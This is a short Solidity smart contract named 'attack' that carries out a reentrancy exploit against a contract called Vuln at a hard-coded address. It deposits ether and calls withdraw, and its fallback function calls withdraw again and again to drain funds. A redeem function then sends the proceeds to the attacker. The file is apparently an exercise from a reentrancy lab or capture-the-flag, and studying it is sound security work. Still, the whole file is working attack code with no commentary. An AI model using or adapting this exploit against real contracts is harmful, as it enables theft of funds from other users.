pragma solidity ^0.5.0;
import 'vuln.sol';
contract attack {
    Vuln vuln = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    address payable owner;
    constructor() public {
        owner = msg.sender;
    }

    function () payable external{
        if (address(this).balance <= 1 ether){
            vuln.withdraw();
        }
    }

    function attackFunc() public payable {
        vuln.deposit.value(msg.value)();
        vuln.withdraw();
    }

    function redeem() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}